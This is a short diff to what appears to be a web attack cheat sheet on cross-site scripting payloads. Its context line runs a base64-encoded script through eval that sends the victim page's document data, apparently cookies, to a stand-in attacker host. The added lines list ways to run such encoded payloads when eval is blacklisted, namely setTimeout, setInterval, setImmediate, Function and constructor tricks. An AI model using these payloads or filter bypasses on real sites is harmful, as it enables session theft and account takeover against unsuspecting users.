@@ -13,3 +13,7 @@ eval(atob(bG9jYXRpb24uaHJlZiA9ICdodHRwOi8vZXZpbHBhdGguY29tLz9jPScrZXNjYXBlKGRvY3
 
 In the event the `eval` function is blacklisted, the following functions can be used as an alternative:
 - `[].constructor.constructor('BASE_64_ENCODED_PAYLOAD')()`
+- `setTimeout('BASE_64_ENCODED_PAYLOAD')`
+- `setInterval('BASE_64_ENCODED_PAYLOAD')`
+- `setImmediate('BASE_64_ENCODED_PAYLOAD')`
+- `Function('BASE_64_ENCODED_PAYLOAD')()`
